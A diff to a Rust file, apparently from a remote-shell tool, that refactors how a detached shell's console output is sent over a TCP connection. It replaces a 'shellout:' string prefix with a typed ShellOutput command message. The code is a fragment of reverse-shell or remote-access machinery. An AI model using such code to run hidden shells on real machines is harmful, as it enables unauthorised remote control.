@@ -4,7 +4,8 @@ use std::process::Child;
 use std::net::TcpStream;
 use std::sync::{Arc, Mutex};
 
-use common::buffers::{read_console_buffer, write_bytes};
+use common::buffers::{read_console_buffer, write_buffer};
+use common::commands::Command;
 
 pub fn start_shell(write_stream: Arc<Mutex<TcpStream>>, remote_shell: &mut Option<Child>) {
     const DETACH: u32 = 0x00000008;
@@ -30,9 +31,8 @@ pub fn start_shell(write_stream: Arc<Mutex<TcpStream>>, remote_shell: &mut Optio
                                 cmd_buffer += &String::from_utf8_lossy(&vec);
 
                                 if String::from_utf8_lossy(&vec).ends_with('>') {
-                                    cmd_buffer = String::from("shellout:") + &cmd_buffer;
                                     let mut ws_lock = write_stream.lock().unwrap();
-                                    write_bytes(&mut ws_lock, cmd_buffer.as_bytes());
+                                    write_buffer(&mut ws_lock, Command::ShellOutput(cmd_buffer.to_string()));
                                     cmd_buffer.clear();
                                 }
                             },
